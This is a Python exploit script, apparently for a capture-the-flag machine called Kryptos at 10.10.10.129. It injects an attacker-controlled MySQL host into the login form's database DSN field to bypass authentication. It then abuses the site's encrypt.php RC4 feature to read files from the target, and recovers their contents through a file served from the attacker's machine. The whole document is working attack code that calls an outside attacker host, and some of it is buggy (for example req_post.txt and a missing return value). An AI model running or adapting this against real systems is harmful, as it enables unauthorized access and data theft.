import requests
import re
from base64 import b64decode
import os
import argparse

init_url = "http://10.10.10.129/"
sess = requests.Session()

# login and return cookies
def login(username, password, remote_vps, port="3306"):
    try:
        req = sess.get(init_url)
        req_text = req.text
        token_lst = re.findall('[a-f0-9]{64}', req_text)
        if len(token_lst) == 0:
            print("[*] An error has occurred while getting token......")
            die("[*] Exit.....")
        token = token_lst[0]
        print("[*] Your token is ", token)
    except Exception as e:
        print(e)

    login_data = {
        "username": username,
        "password": password,
        "db": "cryptor;host=" + remote_vps + ";port=" + port,
        "token": token,
        "login": ""
    }

    try:
        req_post = sess.post(url=init_url, data=login_data)
        if "PDOException" in req_post:
            pdoexp_text = req_post.txt
            print("[*] Response: " + pdoexp_text)
            print("[*] Exit......")
        else:
            if 'File Encryption Services' in req_post.text:
                cookieJar = sess.cookies
                cookiedict = requests.utils.dict_from_cookiejar(cookieJar)
                print("[*] Login success, the cookies is", cookiedict['PHPSESSID']) 
    except Exception as e:
        print(e)


# save rc4 secret to attacker machine
def create_file(content):
    content = b64decode(content)
    with open("my_rc4", 'wb') as f:
        f.write(content)
        f.close()

# encrypt the local files of host Kryptos
# url: the file needs to be encrypted
def encrypt(encrypt_file_url, cookies):
    params = {
        'cipher': 'RC4',
        'url': encrypt_file_url
    }
    req_get = sess.get(url=init_url+"encrypt.php", params=params, cookies=cookies)
    content = req_get.text
    rc4_start = '<textarea class="form-control" name="textarea" rows="20" id="output">'
    rc4_end = '</textarea>'
    idx_start = content.find(rc4_start) + len(rc4_start)
    idx_end = content.find(rc4_end)
    rc4_content = content[idx_start:idx_end]

    # wirte the secret content to my attacker machine
    create_file(rc4_content)


# decrypt the local files of attacker machine - my_rc4
def decrypt(decrypt_file_url):
    params = {
        'cipher': 'RC4',
        'url': decrypt_file_url
    }
    req_get = sess.get(url=init_url+"encrypt.php", params=params, cookies=cookies)
    content = req_get.text
    rc4_start = '<textarea class="form-control" name="textarea" rows="20" id="output">'
    rc4_end = '</textarea>'
    idx_start = content.find(rc4_start) + len(rc4_start)
    idx_end = content.find(rc4_end)
    rc4_content = content[idx_start:idx_end]

    print("[*] Get the source file......")
    output(rc4_content)

def output(content):
    content = b64decode(content)
    with open('output', 'wb') as f:
        f.write(content)
        f.close()

    # readfile
    os.system("cat ./output")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("decrypt_file_url", help="decrypt_file_url")
    parser.add_argument("username", help="your username")
    parser.add_argument("password", help="your password")
    parser.add_argument("attack_ip", help="your attack ip")
    parser.add_argument("--port", help='your local mysql port')
    args = parser.parse_args()
    
    username = args.username
    password = args.password
    remote_vps = args.attack_ip
    port = args.port

    cookies = login(username, password, remote_vps)

    encrypt_file_url = args.decrypt_file_url
    encrypt(encrypt_file_url, cookies)

    decrypt_file_url = "http://" + remote_vps + ":8000/my_rc4"
    decrypt(decrypt_file_url)
